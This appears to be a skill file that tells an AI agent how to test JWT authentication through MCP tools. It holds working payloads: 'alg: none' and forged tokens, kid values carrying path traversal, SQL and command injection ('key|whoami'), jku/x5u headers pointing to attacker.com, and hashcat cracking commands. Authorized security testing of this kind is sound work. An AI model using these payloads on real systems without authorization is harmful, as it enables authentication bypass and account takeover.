# JWT Security Analysis Skill

## Objective
Analyze JSON Web Tokens (JWT) for security vulnerabilities including algorithm confusion, weak secrets, and claim manipulation.

## Instructions

### 1. Identify JWT Tokens
Look for JWTs in:
- Authorization header: `Authorization: Bearer eyJ...`
- Cookies
- Request/response bodies
- URL parameters

JWT format: `header.payload.signature` (Base64URL encoded)

### 2. Decode and Analyze JWT
Use `jwt_decode` tool to decode the token.

**Analyze Header:**
```json
{
  "alg": "HS256",  // Algorithm
  "typ": "JWT",
  "kid": "key-id"  // Key ID (if present)
}
```

**Analyze Payload:**
```json
{
  "sub": "1234567890",  // Subject
  "name": "John Doe",
  "iat": 1516239022,    // Issued at
  "exp": 1516242622,    // Expiration
  "role": "user",       // Custom claims
  "admin": false
}
```

### 3. Algorithm Confusion Attacks

**None algorithm:**
Change header to `"alg": "none"` and remove signature:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.
```

Variations to try:
```
"alg": "none"
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
```

**RS256 to HS256 confusion:**
If server uses RS256, change to HS256 and sign with public key:
1. Obtain public key (often in JWKS endpoint, certificate, or public directory)
2. Change header: `"alg": "HS256"`
3. Sign payload with public key as HMAC secret

### 4. Key ID (kid) Injection

**Path traversal:**
```json
{
  "alg": "HS256",
  "kid": "../../../dev/null"  // Sign with empty key
}
```

**SQL injection:**
```json
{
  "alg": "HS256",
  "kid": "key' UNION SELECT 'secret-key'--"
}
```

**Command injection:**
```json
{
  "alg": "HS256",
  "kid": "key|whoami"
}
```

### 5. JKU/X5U Header Injection
If server fetches keys from URLs:

**JKU (JWK Set URL) injection:**
```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json"
}
```
Host your own JWKS with your key pair.

**X5U (X.509 URL) injection:**
```json
{
  "alg": "RS256",
  "x5u": "https://attacker.com/cert.pem"
}
```

### 6. Weak Secret Attacks
For HS256/HS384/HS512, brute force the secret:

**Common weak secrets:**
```
secret
password
123456
jwt_secret
your-256-bit-secret
key
admin
changeme
```

**Hashcat for offline cracking:**
```bash
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

**John the Ripper:**
```bash
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt
```

### 7. Claim Manipulation

**Privilege escalation:**
```json
{
  "role": "admin",      // Change from "user"
  "admin": true,        // Change from false
  "is_admin": 1,        // Add admin flag
  "group": "administrators"
}
```

**User impersonation:**
```json
{
  "sub": "admin",       // Change subject
  "user_id": 1,         // Admin user ID
  "email": "admin@example.com"
}
```

**Expiration bypass:**
```json
{
  "exp": 9999999999,    // Far future
  "iat": 0,             // Epoch start
  "nbf": 0              // Not before: epoch
}
```

### 8. Token Lifetime Issues

**Check for:**
- Tokens that never expire (no `exp` claim)
- Very long expiration times
- Tokens still valid after logout
- Tokens valid across different sessions
- No `iat` (issued at) tracking

### 9. Signature Verification Bypass

**Remove signature entirely:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.
```

**Empty signature with period:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.
```

**Invalid base64 in signature:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.!!!invalid!!!
```

### 10. JWKS Endpoint Vulnerabilities

**Find JWKS endpoint:**
```
/.well-known/jwks.json
/jwks.json
/api/keys
/oauth/discovery/keys
```

**Test for:**
- Key confusion (multiple keys with same kid)
- Stale keys still accepted
- Missing key rotation

### 11. Cross-Service Token Reuse
Test if JWT from one service works on another:
- Same organization, different applications
- Dev tokens on production
- Staging tokens on production

### 12. Confirm and Document
Use `http1_request` with modified JWT to verify vulnerability.

If confirmed, create finding with:
- Original JWT decoded
- Vulnerability type (algorithm confusion, weak secret, etc.)
- Modified JWT payload
- Evidence (successful authentication, privilege escalation)
- Impact assessment

## MCP Tools to Use
- `jwt_decode`: Decode and analyze JWT
- `http1_request` / `http2_request`: Test modified tokens
- `base64_encode` / `base64_decode`: Manual JWT manipulation
- `repeater_tab_with_payload`: Manual testing
- `issue_create`: Report confirmed finding

## References
- PayloadsAllTheThings/JSON Web Token
- Auth0 JWT Handbook
- RFC 7519 - JSON Web Token
